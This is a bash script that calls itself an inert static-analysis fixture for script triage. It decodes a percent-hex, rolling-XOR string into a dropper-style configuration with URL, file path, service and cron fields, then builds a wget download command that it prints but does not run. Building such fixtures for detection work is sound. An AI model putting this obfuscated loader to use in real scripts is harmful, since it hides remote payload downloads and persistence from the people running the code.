# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_c4894364='%4c%71%40%3c%4f%3b%5e%2e%5d%60%01%62%13%66%0f%7d%18%47%35%50%3d%52%26%43%6f%18%6a%03%77%12%4d%2b%42%2e%4b%37%56%32%53%23%57%32%40%7d%0a%6d%08%7c%23%4c%39%4d%3d%48%3c%40%33%47%26%41%24%7b%18%77%02%6c%18%25%14%68%0b%6a%07%77%16%7f%18%76%29%40%24%19%7a%1b%76%06%67%0e%69%07%2a%1c%28%4b%2a%1e%29%4f%2a%13%23%5f%2a%58%34%09%61%15%61%11%62%58%77%58%6e%5a%39%58%6c%5b%3d%58%61%51%7f%1a%62%03%6e%1e%72%17%39%50%3e%48%29%45%2c%48%67%04%66%5e%3f%5d%68%5b%3f%11%62%0a%76%03%70%15%67%38%59%3e%5b%35%41%7c%34%41%2f%5b%29%4c%3f%4c%00%61%03%2c%1a%2e%4d%2c%18%2f%49%2c%15%25%59%3f%56%3a%5f%00%70%11%65%0d%30%1f%6b%06%76%59%31%44%2a%5e%2c%49%3a%49%64%07%66%05%6d%08%27%09%7a%0e%6f%08%6d%40%76%42%21%40%74%43%25%40%79%49'
readonly Codec_c4894364='percent_hex|rolling_xor|3a'

Load_c4894364() {
  v_a19c=()
  local raw="${Material_c4894364}" v_f602
  for v_f602 in ${raw//%/ }; do [[ -n "$v_f602" ]] && v_a19c+=("$((16#$v_f602))"); done
}

Decode_c4894364() {
  v_b27e=()
  local v_a702=58
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e+=("$((v_a19c[v_e598] ^ v_a702))")
    v_a702=${v_a19c[v_e598]}
  done
}

Recover_c4894364() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  local -a compass=(north south); v_d41a="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_c4894364
  v_b803=0; while ((v_b803 < 1)); do Decode_c4894364; ((v_b803+=1)); done
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_c4894364() { local recovered; recovered="$(Recover_c4894364)"; printf '%s\n' "$recovered"; }

Plan_c4894364() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_c4894364)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_c4894364; fi

# reconstruction complete